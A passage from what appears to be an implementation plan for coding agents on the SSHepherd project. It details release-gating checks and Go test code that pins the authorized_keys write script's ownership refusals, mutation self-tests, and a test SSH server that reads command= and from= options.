- [ ] **Toolchain lockstep, new bullet under Build & tests or CI (`~:130-145`).** "go.mod's `go` line, the Dockerfile build stage tag, the Makefile's `GO_PIN` and CI's `setup-go` (`go-version-file: go.mod`) name the same Go patch release; CI and release fail otherwise. Go bump procedure: bump go.mod, the Dockerfile and `GO_PIN` together in one commit (on the Dependabot `golang` PR's branch, or by hand)." Add a sentence on release gating: "release.yml publishes only a `vX.Y.Z` tag on master after `check`, `integration`, `image` and `gate` pass; Dependabot has a 7-day cooldown (security updates are immediate)."
- [ ] Line 82: "Target **Go 1.22+**" → "Target **Go 1.27.3** (go.mod)". Line 93's loop-variable note stays.
- [ ] **Status.** Append one sentence: "Releases are gated (tag on master, `make check`, `make integration`, one cross-compiled multi-arch build gated per arch by digest, then tag/sign/verify), CI checks the shipped Go and scans the published image daily, and Dependabot waits 7 days."
- [ ] Commit (integrator only, on master): `ci(release): gate releases on master + checks, build once, gate by digest, tighten verify identity`, with the attribution trailer from the session reminder.

#### Task V1: Independent verification (read-only)

- [ ] Re-run Acceptance.
- [ ] Assert that the `cosign verify` lines in README.md and release.yml match byte for byte: `diff <(grep -A4 '^\$ cosign verify' README.md | sed 's/^\$ //;s/^ *//') <(grep -A4 'cosign verify "' .github/workflows/release.yml | sed 's/^ *//')`, ignoring the image argument and `>/dev/null`.
- [ ] Assert that every job in release.yml except `verify-ref` transitively needs `verify-ref`, and that only `publish` has `id-token`.
- [ ] Assert that no `go-version:` key remains: `grep -n 'go-version:' .github/workflows/*.yml` prints nothing.
- [ ] After the first real release (owner's tag): run the README `cosign verify` with the pinned `COSIGN_VERSION` and with the last cosign v2 release, and record in README which versions work (the minimum stated there must be true).
- [ ] **Post-push check (main session, after step 6; fix forward if red):** `gh workflow run release.yml --ref master`, then `gh run watch`. GitHub dispatches only a workflow file that is on the default branch, so this cannot run before the push. All jobs except `publish` must be green, and `publish` must be **skipped**. Then `git tag` nothing; the first real tag is the owner's call, after the D6 tag ruleset exists.

#### Owner follow-ups (not agent work)

- **D6** (tag ruleset + required checks), asked **before the W0 push** (review panel, ops-release). A tag push runs the release.yml **from the tagged commit**, so a `v*` tag on any commit up to adee207 would run the old ungated workflow, and the tightened `cosign verify` identity would accept its signature. The **v\* tag ruleset** (restrict creation, update and deletion to the owner) is therefore a **precondition for the first release**, not an option, and the release runbook says: "every release tag must point at a commit at or after the W0 release-gating commit `<sha>`" (the W0 integrator records that SHA in CLAUDE.md Status). Required checks: if ever added, require only `ci-ok`. Optionally add a `release` GitHub environment on `publish` so a stray tag still needs one owner click before signing.
- **Required before the first tag:** set the GHCR package public and linked to the repository ("Inherit access from repository"). The first dry-run push creates the package private.

#### Acceptance

```bash
GOTOOLCHAIN=go1.27.3 go run github.com/rhysd/actionlint/cmd/actionlint@v1.7.12 -shellcheck= .github/workflows/ci.yml .github/workflows/release.yml
hadolint Dockerfile
make docker docker-lint docker-scan smoke
docker buildx build --platform linux/arm64 --load -t sshepherd:arm64 . && ./scripts/docker-gates.sh --platform linux/arm64 sshepherd:arm64
docker buildx build --platform linux/amd64 --load -t sshepherd:amd64 . && ./scripts/docker-gates.sh --platform linux/amd64 sshepherd:amd64
./scripts/docker-gates.sh --platform <foreign> sshepherd:wrongarch   # must FAIL (A2 T2)
yq -o=json -I=0 '.jobs.publish.needs | sort' .github/workflows/release.yml   # ["check","gate","image","integration","verify-ref"]
yq -o=json -I=0 '[.updates[].cooldown."default-days"]' .github/dependabot.yml # [7,7,7]
make check
make integration
# pre-push: the CI preflight branch run is green (Execution model step 6)
# post-push (main session): gh workflow run release.yml --ref master → all green, publish skipped
```

#### Out of scope

- **OPS-10 / D7**: signed release binaries and SHA256SUMS, `-X main.version` in `make build`, the `ReadBuildInfo` fallback. These go to P13 or a later package, since they touch the Makefile and run.go. release.yml is laid out so a `binaries` job can be added to `publish.needs` later.
- Makefile targets (`make actionlint`, a `smoke` that passes `--platform`), which belong to P13. Repo rulesets and required checks are owner-only (D6).
- Kyverno/Gatekeeper admission-policy YAML, SLSA generator reusable workflows, and a GHCR retention policy for untagged dry-run digests.
- Any product behavior, manifest schema or on-hold item. P02 touches none of them.

---

### P03 — Safety-net tests for the write script: ownership refusals, real-sshd probe, order-independent integration tests

> **Program notes (master plan):** Only one `make integration` per machine until P13 Task 10 (fixed container name). P13 Task 10 later replaces this package's `chown nobody:nobody` and `AuthorizedKeysFile` sed guard with portable helpers.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

- **Kind:** fix (tests and test infrastructure only; no product behavior changes)
- **Wave:** 0
- **Depends on:** nothing
- **Goal:** Put a safety net under the write script before Wave 2 (P11) rewrites it. Every owner check in the script must have a test that fails when that check is removed. The login probe must be proven against a real `sshd` (and a hermetic server that reads the written file). Integration tests must pass in any order and on a second run.
- **Architecture:** Two lanes with disjoint files. Lane A extends the hermetic `sshtest` server with an `AuthorizedKeysFile` mode and adds the unit and hermetic tests to `sshwrite_test.go`. Lane B adds fixture users to `scripts/integration.sh`, adds a `reseed` helper and new cases to `integration_test.go`, and runs the `sshwrite` integration package shuffled and twice.
- **Tech Stack:** Go 1.27.3 (pinned by the Makefile), `golang.org/x/crypto/ssh` (`ParseAuthorizedKey`, `Permissions.CriticalOptions`), POSIX shells (sh, dash, bash --posix, busybox), Alpine `sshd` in Docker, goleak.

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| TST-1 | HIGH | The write script's owner checks (exit 48 at `internal/sshwrite/sshwrite.go:160`, `:161`, `:199`, `:202`) are never tested. Removing all of them leaves `./internal/sshwrite`, `./internal/apply` and `./cmd/sshepherd` green. |
| TST-3 | MEDIUM | The post-write login probe's promise (it catches a `command=`/`from=` survivor) is only tested with a scripted exec (`sshwrite_test.go:717`, `probe: &execResp{stdout: "forced\n"}`). `sshtest` accepts keys from a fixed list (`sshtest.go:273-284`) and never reads the written file. |
| TST-9 | LOW | Integration tests share users and depend on run order. `writer` is mutated by three tests (`integration_test.go:137`, `:185`, `:421`), and `virgin` by two (`:206`, `:229`). `-shuffle=on` or `-count=2` gives false failures. |

#### Files owned (exclusive in Wave 0)

| Lane | Files |
|---|---|
| A | `internal/sshconn/sshtest/sshtest.go`, `internal/sshconn/sshtest/sshtest_test.go` (new), `internal/sshwrite/sshwrite_test.go` |
| B | `internal/sshwrite/integration_test.go`, `scripts/integration.sh` |
| Integrator | `CLAUDE.md` (one Status sentence). `README.md` needs no change (checked below). |

No other package in Wave 0 (P01, P02, P04) touches these files. **Lane B is the only agent that runs `make integration`.** `scripts/integration.sh` uses a fixed container name (`sshepherd-it`, line 7), so two integration runs at the same time on one machine break each other. The integrator and verifier must run it one at a time too.

#### Ground truth (read before starting)

- The owner checks are four `[ "$3" != … ]` tests on `ls -ldn` output:
  - `sshwrite.go:160` is the **as-written** ancestor walk: `if [ "$3" != "$u" ] && [ "$3" != 0 ]; then exit 48; fi` (root is accepted).
  - `sshwrite.go:161` is the **resolved** (`cd -P`) ancestor walk. Its text is the same.
  - `sshwrite.go:199` is the **target directory** check: `if [ "$3" != "$u" ]; then exit 48; fi`. Root is **not** accepted.
  - `sshwrite.go:202` is the **target file** check, run under the lock. Its text is the same as line 199, and root is **not** accepted.
- `ancestorCheck` is also used by `restoreCmdFor` (`:235`) and `disableKeys2Cmd` (`:246`).
- The unit shell matrix (`shells`, `runShEnv`, `forEachShell` at `sshwrite_test.go:85-134`) already stubs `mkdir` through `PATH` (`:484-511`). It skips when busybox-static runs the applet and ignores `PATH` (commit fb163d9). The `ls` stub uses the same skip rule.
- To isolate each check:
  - A **root-owned** target directory trips only `:199`, because both ancestor walks accept uid 0.
  - A foreign-owned **file** trips only `:202`, because the walks start at the directory.
  - A foreign-owned **symlinked ancestor** trips only `:160`, because the resolved walk never sees the link.
  - A foreign-owned **resolved directory** behind a link the user owns trips only `:161`.
- A `~/.ssh` owned by `nobody` (the finding's suggestion) would make sshd's StrictModes refuse that user's **own** login, so the fixture could not connect. The integration fixtures use these instead:
  - a **root-owned** `~/.ssh` and a root-owned file. sshd accepts both, and the write script must refuse both at `:199`/`:202`.
  - a `nobody`-owned ancestor under an `authorized_keys_file` override, outside `~/.ssh`.
- Probe: `probe()` (`sshwrite.go:589-602`) requires `probeOutput` on stdout. `probeOrRestore` (`:542-575`) restores over the still-open write connection.

---

#### Task 1 (Lane A): unit shell matrix, one refusal row per owner check, plus a committed mutation self-test

**Files:** Modify `internal/sshwrite/sshwrite_test.go`. Add the helpers next to `runShEnv`. Add the subtest inside `TestWriteCmdThroughRealSh` (after "ancestor symlink to a safe directory is followed", around `:390`). Add one row to `TestRestoreCmdThroughRealSh`, and a new top-level `TestOwnerChecksBite`.

- [ ] **Step 1: Add the `ls` stub helper and the case table.** Write this test code:

```go
// foreignUID is the owner the ls stub reports for a path the test wants to
// look foreign. Tests that report uid 0 skip when the suite runs as root.
const foreignUID = "4242"

// lsStub installs a PATH stub for ls that reports uid as the owner of the
// exact path foreign (the string the script passes) and delegates every
// other call to the real ls. called reports whether the stub ran at all
// (busybox-static runs ls as an applet and ignores PATH). fired reports
// whether it rewrote foreign.
func lsStub(t *testing.T, foreign, uid string) (env []string, called, fired func() bool) {
	t.Helper()
	stub := t.TempDir()
	lsBin, err := exec.LookPath("ls")
	if err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(stub, "ls"), "#!/bin/sh\n"+
		": > \"$SSHEPHERD_STUB_DIR/called\"\n"+
		"out=$("+lsBin+" \"$@\") || exit $?\n"+
		"if [ \"$2\" = \"$SSHEPHERD_FOREIGN\" ]; then\n"+
		"  : > \"$SSHEPHERD_STUB_DIR/fired\"; set -f; set -- $out; m=$1 n=$2; shift 3\n"+
		"  printf '%s %s %s %s\\n' \"$m\" \"$n\" \"$SSHEPHERD_FOREIGN_UID\" \"$*\"\n"+
		"else printf '%s\\n' \"$out\"; fi\n")
	if err := os.Chmod(filepath.Join(stub, "ls"), 0o700); err != nil { // #nosec G302 -- test stub must be executable
		t.Fatal(err)
	}
	exists := func(n string) func() bool {
		return func() bool { _, err := os.Stat(filepath.Join(stub, n)); return err == nil }
	}
	return []string{"PATH=" + stub + ":" + os.Getenv("PATH"), "SSHEPHERD_STUB_DIR=" + stub,
		"SSHEPHERD_FOREIGN=" + foreign, "SSHEPHERD_FOREIGN_UID=" + uid}, exists("called"), exists("fired")
}

// ownerCase is one owner-check refusal in the write script. mutant names
// the single check (ownerMutants) whose removal must flip this row to a
// successful write ("" when more than one check catches it).
type ownerCase struct {
	name   string
	uid    string
	mutant string
	setup  func(t *testing.T, home string) (target, foreign string, expect Snapshot)
}

func dotSSHWithFile(t *testing.T, home string) (string, string) {
	t.Helper()
	d := filepath.Join(home, "dot-ssh")
	if err := os.Mkdir(d, 0o700); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(d, "auth")
	writeFile(t, target, "k\n")
	return d, target
}

// linkedAncestor makes home/sub a symlink (owned by the login user) to the
// safe directory home/real, and returns the target under the link.
func linkedAncestor(t *testing.T, home string) (link, real, target string) {
	t.Helper()
	real = filepath.Join(home, "real")
	if err := os.Mkdir(real, 0o700); err != nil {
		t.Fatal(err)
	}
	link = filepath.Join(home, "sub")
	if err := os.Symlink(real, link); err != nil {
		t.Fatal(err)
	}
	return link, real, filepath.Join(link, "dot-ssh", "auth")
}

var ownerCases = []ownerCase{
	{name: "target dir owned by root (non-root login)", uid: "0", mutant: "dir", // sshwrite.go:199 only: the walks accept root
		setup: func(t *testing.T, home string) (string, string, Snapshot) {
			d, target := dotSSHWithFile(t, home)
			return target, d, SnapshotOf(false, []byte("k\n"))
		}},
	{name: "target dir owned by another user", uid: foreignUID, // :199 and the as-written walk both catch it
		setup: func(t *testing.T, home string) (string, string, Snapshot) {
			d, target := dotSSHWithFile(t, home)
			return target, d, SnapshotOf(false, []byte("k\n"))
		}},
	{name: "target file owned by another user", uid: foreignUID, mutant: "file", // :202 only
		setup: func(t *testing.T, home string) (string, string, Snapshot) {
			_, target := dotSSHWithFile(t, home)
			return target, target, SnapshotOf(false, []byte("k\n"))
		}},
	{name: "target file owned by root (non-root login)", uid: "0", mutant: "file", // :202 has no root exemption
		setup: func(t *testing.T, home string) (string, string, Snapshot) {
			_, target := dotSSHWithFile(t, home)
			return target, target, SnapshotOf(false, []byte("k\n"))
		}},
	{name: "symlinked ancestor owned by another user", uid: foreignUID, mutant: "ancestor-written", // :160 only
		setup: func(t *testing.T, home string) (string, string, Snapshot) {
			link, _, target := linkedAncestor(t, home)
			return target, link, Snapshot{Absent: true}
		}},
	{name: "resolved ancestor owned by another user", uid: foreignUID, mutant: "ancestor-resolved", // :161 only
		setup: func(t *testing.T, home string) (string, string, Snapshot) {
			_, real, target := linkedAncestor(t, home)
			phys, err := filepath.EvalSymlinks(real) // what pwd -P prints (macOS: /private/var/…)
			if err != nil {
				t.Fatal(err)
			}
			return target, phys, Snapshot{Absent: true}
		}},
}

// runOwnerCase runs c's write script (after mutate) under sh with the ls
// stub. It returns the exit code and target, and skips when the shell
// ignores PATH or the uid cannot look foreign.
func runOwnerCase(t *testing.T, sh []string, c ownerCase, mutate func(string) string) (code int, target string, expect Snapshot) {
	t.Helper()
	if c.uid == strconv.Itoa(os.Getuid()) {
		t.Skipf("running as uid %s: the stubbed owner is not foreign", c.uid)
	}
	home := t.TempDir()
	target, foreign, expect := c.setup(t, home)
	env, called, fired := lsStub(t, foreign, c.uid)
	code = runShEnv(t, sh, mutate(writeCmdFor(target, expect, len(managed))), home, []byte(managed), env...)
	if !called() {
		t.Skipf("%v runs ls as a built-in applet; a PATH stub cannot fake an owner", sh)
	}
	if !fired() {
		t.Fatalf("the script never listed %s — the case no longer reaches its check", foreign)
	}
	return code, target, expect
}
```

- [ ] **Step 2: Add the refusal subtest and the root-accepted control.** Put them inside `TestWriteCmdThroughRealSh`'s `forEachShell` body:

```go
		t.Run("owner checks refuse foreign-owned paths", func(t *testing.T) {
			for _, c := range ownerCases {
				t.Run(c.name, func(t *testing.T) {
					code, target, expect := runOwnerCase(t, sh, c, func(s string) string { return s })
					if code != unsafePathExit {
						t.Fatalf("exit = %d, want the %d unsafe-path sentinel", code, unsafePathExit)
					}
					if expect.Absent {
						assertAbsent(t, target, "nothing may be written through a foreign-owned path")
					} else if got := readFile(t, target); got != "k\n" {
						t.Errorf("file = %q, want it untouched", got)
					}
					assertAbsent(t, target+bakSuffix, "a refused write takes no backup")
					assertNoResidue(t, target)
				})
			}
		})

		t.Run("root-owned ancestor is accepted (StrictModes allows root)", func(t *testing.T) {
			home := t.TempDir()
			_, real, _ := linkedAncestor(t, home)
			target := filepath.Join(real, "dot-ssh", "auth") // as written: home/real is a plain ancestor
			env, called, fired := lsStub(t, real, "0")
			code := runShEnv(t, sh, writeCmdFor(target, Snapshot{Absent: true}, len(managed)), home, []byte(managed), env...)
			if !called() {
				t.Skipf("%v runs ls as a built-in applet", sh)
			}
			if !fired() || code != 0 {
				t.Fatalf("exit = %d (stub fired %v), want 0: a root-owned ancestor is safe", code, fired())
			}
			if got := readFile(t, target); got != managed {
				t.Errorf("file = %q, want the render", got)
			}
		})
```

- [ ] **Step 3: Add a restore row.** `restoreCmdFor` uses the same `ancestorCheck`. Put this inside `TestRestoreCmdThroughRealSh`'s `forEachShell` body:

```go
		t.Run("foreign-owned ancestor refuses before touching the file", func(t *testing.T) {
			home := t.TempDir()
			link, real, target := linkedAncestor(t, home)
			if err := os.Mkdir(filepath.Join(real, "dot-ssh"), 0o700); err != nil {
				t.Fatal(err)
			}
			writeFile(t, target, managed)
			writeFile(t, target+bakSuffix, "previous\n")
			env, called, _ := lsStub(t, link, foreignUID)
			code := runShEnv(t, sh, restoreCmdFor(target, false, SnapshotOf(false, []byte(managed))), home, nil, env...)
			if !called() {
				t.Skipf("%v runs ls as a built-in applet", sh)
			}
			if code != unsafePathExit {
				t.Fatalf("exit = %d, want %d", code, unsafePathExit)
			}
			if readFile(t, target) != managed || readFile(t, target+bakSuffix) != "previous\n" {
				t.Error("a refused restore must leave the file and its backup alone")
			}
		})
```

- [ ] **Step 4: Run. The new cases must PASS on the current code.** They pin existing behavior.
  `go test -race ./internal/sshwrite/ -run 'TestWriteCmdThroughRealSh/.*/(owner_checks|root-owned_ancestor)|TestRestoreCmdThroughRealSh/.*/foreign-owned' -v`
  Expected: every row PASSes under `sh`, and under dash, bash and busybox where installed. A busybox-static build shows SKIP.

- [ ] **Step 5: Add the committed mutation self-test.** It is TDD inverted: it proves each row bites. Add this:

```go
const (
	dirFileOwnerCheck  = `if [ "$3" != "$u" ]; then exit 48; fi`                      // sshwrite.go:199 (1st), :202 (2nd)
	ancestorOwnerCheck = `if [ "$3" != "$u" ] && [ "$3" != 0 ]; then exit 48; fi` // :160 (1st), :161 (2nd)
)

// replaceNth replaces the n-th (1-based) occurrence of old in s. It fails
// when there are fewer, so a rewrite of the script text breaks this test
// loudly instead of passing without checking anything.
func replaceNth(t *testing.T, s, old string, n int, repl string) string {
	t.Helper()
	idx := 0
	for i := 1; ; i++ {
		j := strings.Index(s[idx:], old)
		if j < 0 {
			t.Fatalf("occurrence %d of %q not found in the write script — update ownerMutants", n, old)
		}
		if i == n {
			return s[:idx+j] + repl + s[idx+j+len(old):]
		}
		idx += j + len(old)
	}
}

// TestOwnerChecksBite removes one owner check at a time and requires the
// row that targets it to stop refusing. This proves the ownerCases rows
// cover each check alone, not only all of them together.
func TestOwnerChecksBite(t *testing.T) {
	mutants := map[string]struct {
		needle string
		n      int
	}{
		"dir": {dirFileOwnerCheck, 1}, "file": {dirFileOwnerCheck, 2},
		"ancestor-written": {ancestorOwnerCheck, 1}, "ancestor-resolved": {ancestorOwnerCheck, 2},
	}
	if got := strings.Count(writeCmdFor("/x/y", Snapshot{Absent: true}, 1), dirFileOwnerCheck); got != 2 {
		t.Fatalf("dir/file owner checks = %d, want 2 — update the mutation table", got)
	}
	forEachShell(t, func(t *testing.T, sh []string) {
		for _, c := range ownerCases {
			if c.mutant == "" {
				continue
			}
			m := mutants[c.mutant]
			t.Run(c.name, func(t *testing.T) {
				code, _, _ := runOwnerCase(t, sh, c, func(s string) string { return replaceNth(t, s, m.needle, m.n, ":") })
				if code == unsafePathExit {
					t.Fatalf("with the %s owner check removed the script still exits 48 — the row does not isolate that check", c.mutant)
				}
			})
		}
	})
}
```

- [ ] **Step 6: Run. It must PASS,** meaning each mutant flips its row to a non-48 exit (expect 0):
  `go test -race ./internal/sshwrite/ -run TestOwnerChecksBite -v`

- [ ] **Step 7: Manual mutation check on the real source** (scratch copy only, never committed). This matches the finding's reproduction:
  ```bash
  MUT=/private/tmp/claude-501/-Users-javad-w-personal-SSHepherd/72c73a75-5bc2-4253-801e-f8f28b1637f0/scratchpad/mut-p03
  rm -rf "$MUT" && mkdir -p "$MUT" && rsync -a --exclude .git /Users/javad/w/personal/SSHepherd/ "$MUT/"
  cd "$MUT" && perl -0pi -e 's/if \[ "\$3" != "\$u" \]; then exit 48; fi/:/g; s/if \[ "\$3" != "\$u" \] && \[ "\$3" != 0 \]; then exit 48; fi/:/g' internal/sshwrite/sshwrite.go
  go test ./internal/sshwrite/ -run 'TestWriteCmdThroughRealSh|TestRestoreCmdThroughRealSh'
  ```
  Expected: **FAIL**. Every `owner_checks_refuse…` row and the restore row report `exit = 0, want 48`. Record the output in the hand-off note.

- [ ] **Step 8: Linux shells (optional, for local runs on macOS).** CI's ubuntu runner already has dash, bash and busybox. To run them locally as a non-root user:
  `docker run --rm -u 1000:1000 -e HOME=/tmp -e GOCACHE=/tmp/gc -e GOMODCACHE=/tmp/gm -e GOTOOLCHAIN=local -v "$PWD":/src -w /src golang:1.27.3-bookworm sh -c 'go test ./internal/sshwrite/ -run "TestOwnerChecksBite|TestWriteCmdThroughRealSh" -v'`
  The image has bash and sh (dash). The rows that report uid 0 run here because the user is not root.

**Risks:**
- `ls -ldn` output differs by platform. The stub only replaces field 3 and keeps the mode, so the `case $1 in l*|?????w*` logic still sees the real mode.
- `set -f` in the stub stops globbing of the `ls` output.
- On macOS the resolved walk prints `/private/var/…`. Step 1 handles this with `EvalSymlinks`.

---

#### Task 2 (Lane A): `sshtest` authorizes from the written file

**Files:** Modify `internal/sshconn/sshtest/sshtest.go` (`ServerConfig` at `:226-231`, the callback at `:272-285`, `serveConn`/`serveSession` at `:305-368`). Create `internal/sshconn/sshtest/sshtest_test.go`.

- [ ] **Step 1: Write the failing test.** Create `internal/sshconn/sshtest/sshtest_test.go`:

```go
package sshtest

import (
	"bytes"
	"context"
	"io"
	"net"
	"os"
	"path/filepath"
	"testing"

	"go.uber.org/goleak"
	"golang.org/x/crypto/ssh"
)

func TestMain(m *testing.M) { goleak.VerifyTestMain(m) }

func dialAs(t *testing.T, s *Server, host ssh.PublicKey, signer ssh.Signer) (*ssh.Client, error) {
	t.Helper()
	c, err := (&net.Dialer{}).DialContext(t.Context(), "tcp", s.Addr())
	if err != nil {
		t.Fatal(err)
	}
	cc, chans, reqs, err := ssh.NewClientConn(c, s.Addr(), &ssh.ClientConfig{
		User: "u", Auth: []ssh.AuthMethod{ssh.PublicKeys(signer)}, HostKeyCallback: ssh.FixedHostKey(host),
	})
	if err != nil {
		_ = c.Close()
		return nil, err
	}
	cl := ssh.NewClient(cc, chans, reqs)
	t.Cleanup(func() { _ = cl.Close() })
	return cl, nil
}

func run(t *testing.T, cl *ssh.Client, cmd string) string {
	t.Helper()
	sess, err := cl.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = sess.Close() }()
	out, _ := sess.Output(cmd)
	return string(out)
}

func TestAuthorizedKeysFileMode(t *testing.T) {
	hk := Signer(t, Key(200))
	user := Signer(t, Key(1))
	line := string(bytes.TrimSpace(ssh.MarshalAuthorizedKey(user.PublicKey())))
	echo := func(_ context.Context, cmd string, _ io.Reader, stdout, _ io.Writer) int {
		_, _ = io.WriteString(stdout, "ran:"+cmd)
		return 0
	}
	tests := []struct {
		name, file string
		wantAuth   bool
		wantOut    string
	}{
		{"listed key logs in", line + "\n", true, "ran:probe"},
		{"unlisted key is refused", "# empty\n", false, ""},
		{"command= forces the command", `command="forced" ` + line + "\n", true, "ran:forced"},
		{"from= that cannot match refuses", `from="10.255.255.1" ` + line + "\n", false, ""},
		{"from= matching the client accepts", `from="10.0.0.1,127.0.0.*" ` + line + "\n", true, "ran:probe"},
		{"negated from= refuses", `from="!127.0.0.1,*" ` + line + "\n", false, ""},
		{"restrict alone still runs the command", `restrict ` + line + "\n", true, "ran:probe"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := filepath.Join(t.TempDir(), "authorized_keys")
			if err := os.WriteFile(file, []byte(tt.file), 0o600); err != nil {
				t.Fatal(err)
			}
			s := NewServer(t, ServerConfig{HostKeys: []ssh.Signer{hk}, AuthorizedKeysFile: file, Handle: echo})
			cl, err := dialAs(t, s, hk.PublicKey(), user)
			if (err == nil) != tt.wantAuth {
				t.Fatalf("auth err = %v, want auth %v", err, tt.wantAuth)
			}
			if err == nil {
				if got := run(t, cl, "probe"); got != tt.wantOut {
					t.Errorf("output = %q, want %q", got, tt.wantOut)
				}
			}
		})
	}
	t.Run("file is re-read on every login", func(t *testing.T) {
		file := filepath.Join(t.TempDir(), "authorized_keys")
		if err := os.WriteFile(file, []byte(line+"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		s := NewServer(t, ServerConfig{HostKeys: []ssh.Signer{hk}, AuthorizedKeysFile: file, Handle: echo})
		if _, err := dialAs(t, s, hk.PublicKey(), user); err != nil {
			t.Fatalf("first login: %v", err)
		}
		if err := os.WriteFile(file, []byte("# key removed\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if _, err := dialAs(t, s, hk.PublicKey(), user); err == nil {
			t.Fatal("second login succeeded after the key was removed from the file")
		}
	})
}
```

- [ ] **Step 2: Run it. Expect a FAIL to compile** (`unknown field AuthorizedKeysFile in struct literal`):
  `go test -race ./internal/sshconn/sshtest/ -v`

- [ ] **Step 3: Implement it in `sshtest.go`.**
  1. Add the field to `ServerConfig`:
  ```go
	// AuthorizedKeysFile, when set, replaces Authorized. Every login
	// re-reads this file, as sshd does, so tests see exactly what a write
	// left there. It honors the options the login probe depends on:
	// command= forces the command, and from= must match the client address
	// (comma-separated globs, "!" negates). restrict and every other option
	// are accepted and ignored.
	AuthorizedKeysFile string
  ```
  2. In the `PublicKeyCallback`, after recording the attempt, add `if cfg.AuthorizedKeysFile != "" { return authorizeFromFile(cfg.AuthorizedKeysFile, meta.RemoteAddr(), key) }`. Rename the `_ ssh.ConnMetadata` parameter to `meta`.
  3. Add the helpers. The imports gain `bytes`, `path` and `strings`:
  ```go
// authorizeFromFile returns the permissions of the first line in file that
// holds key and whose from= admits remote. Forced commands travel in
// CriticalOptions["force-command"].
func authorizeFromFile(file string, remote net.Addr, key ssh.PublicKey) (*ssh.Permissions, error) {
	data, err := os.ReadFile(file) // #nosec G304 -- test server reads the file the test configured
	if err != nil {
		return nil, errRefused
	}
	host, _, _ := net.SplitHostPort(remote.String())
	want := key.Marshal()
	for len(data) > 0 {
		pub, _, opts, rest, err := ssh.ParseAuthorizedKey(data)
		if err != nil {
			break // no further key lines
		}
		data = rest
		if !bytes.Equal(pub.Marshal(), want) {
			continue
		}
		perms, ok := &ssh.Permissions{CriticalOptions: map[string]string{}}, true
		for _, o := range opts {
			name, val, _ := strings.Cut(o, "=")
			if u, err := strconv.Unquote(val); err == nil {
				val = u
			}
			switch strings.ToLower(name) {
			case "command":
				perms.CriticalOptions["force-command"] = val
			case "from":
				ok = ok && fromMatches(val, host)
			}
		}
		if ok {
			return perms, nil
		}
	}
	return nil, errRefused
}

// fromMatches applies an OpenSSH from= pattern list to host: any negated
// match refuses, otherwise at least one plain pattern must match.
func fromMatches(list, host string) bool {
	matched := false
	for _, p := range strings.Split(list, ",") {
		neg := strings.HasPrefix(p, "!")
		if ok, _ := path.Match(strings.TrimPrefix(p, "!"), host); ok {
			if neg {
				return false
			}
			matched = true
		}
	}
	return matched
}
  ```
  4. In `serveConn`, read `forced := ""` and, if `sconn.Permissions != nil`, set `forced = sconn.Permissions.CriticalOptions["force-command"]`. Pass `forced` to `serveSession`. In the exec goroutine, call the handler with `run` instead of `cmd`, where `run := cmd; if forced != "" { run = forced }`. sshd runs the forced command in place of the client's command. `s.commands` keeps recording the client's raw `cmd`.

- [ ] **Step 4: Run. Expect PASS:** `go test -race ./internal/sshconn/sshtest/ -v`. Then run `go test -race ./internal/sshconn/... ./internal/sshwrite/ ./internal/sshread/ ./cmd/sshepherd/` to confirm no existing user of `ServerConfig` regressed. The change is additive, and `Authorized` behaves as before.

**Risk:** `path.Match` is not OpenSSH's `match_pattern` (no CIDR). This is documented on the field and is enough for the probe tests. Do not use it as a reference for `from=` semantics.

---

#### Task 3 (Lane A, after Task 2): hermetic probe test reads the written file

**Files:** Modify `internal/sshwrite/sshwrite_test.go`. Put the new helper next to `hermetic` (around `:850`) and the new test after `TestApplyHermeticRealConnection`.

- [ ] **Step 1: Write the test.**

```go
// hermeticFromFile is hermetic with a server that authorizes from
// home/.ssh/authorized_keys, so the post-write probe sees the bytes the
// write just installed.
func hermeticFromFile(t *testing.T, home string, agentKeys ...any) (*FleetWriter, config.Server) {
	t.Helper()
	hostKey := sshtest.Signer(t, sshtest.Key(200))
	s := sshtest.NewServer(t, sshtest.ServerConfig{
		HostKeys:           []ssh.Signer{hostKey},
		AuthorizedKeysFile: filepath.Join(home, ".ssh", "authorized_keys"),
		Handle:             sshtest.ShellHandler(home),
	})
	d := &sshconn.Dialer{
		KnownHostsPath: sshtest.KnownHostsFile(t, s.KnownHostsLine(hostKey.PublicKey())),
		Creds:          &sshconn.Credentials{AgentSock: sshtest.Agent(t, agentKeys...)},
		DialTimeout:    5 * time.Second,
	}
	return &FleetWriter{Dialer: d}, config.Server{Name: "h1", Host: s.Host, Port: s.Port, User: "deploy"}
}

func TestApplyHermeticProbeReadsWrittenFile(t *testing.T) {
	op := sshtest.Key(1)
	opLine := strings.TrimSpace(string(ssh.MarshalAuthorizedKey(sshtest.Signer(t, op).PublicKey())))
	tests := []struct {
		name, survivor string
		lockout        bool
		kind           audit.ErrorKind // "" = not asserted
		probeIn        string
	}{
		{"forced command= on the survivor fails the probe", `command="echo forced" ` + opLine, true, "", "forced command="},
		{"from= the client cannot match fails the login", `from="10.255.255.1" ` + opLine, true, audit.ErrorKindAuth, ""},
		{"restrict alone passes the probe (negative control)", `restrict ` + opLine, false, "", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			home := t.TempDir()
			if err := os.Mkdir(filepath.Join(home, ".ssh"), 0o700); err != nil {
				t.Fatal(err)
			}
			target := filepath.Join(home, ".ssh", "authorized_keys")
			previous := opLine + "\n"
			writeFile(t, target, previous)
			w, srv := hermeticFromFile(t, home, op)
			content := authkeys.ManagedHeader + "\n" + tt.survivor + "\n"
			r := Request{Content: []byte(content), Expect: SnapshotOf(false, []byte(previous)), Survivors: []string{sshtest.Fingerprint(t, op)}}
			err := w.Apply(ctxTimeout(t), srv, r)
			if !tt.lockout {
				if err != nil {
					t.Fatalf("Apply: %v", err)
				}
				if got := readFile(t, target); got != content {
					t.Errorf("file = %q, want the render", got)
				}
				return
			}
			var lo *LockoutError
			if !errors.As(err, &lo) || lo.Restore != nil {
				t.Fatalf("err = %v, want a restored *LockoutError", err)
			}
			if tt.kind != "" && audit.ErrorKindOf(lo.Probe) != tt.kind {
				t.Errorf("probe error kind = %q, want %q", audit.ErrorKindOf(lo.Probe), tt.kind)
			}
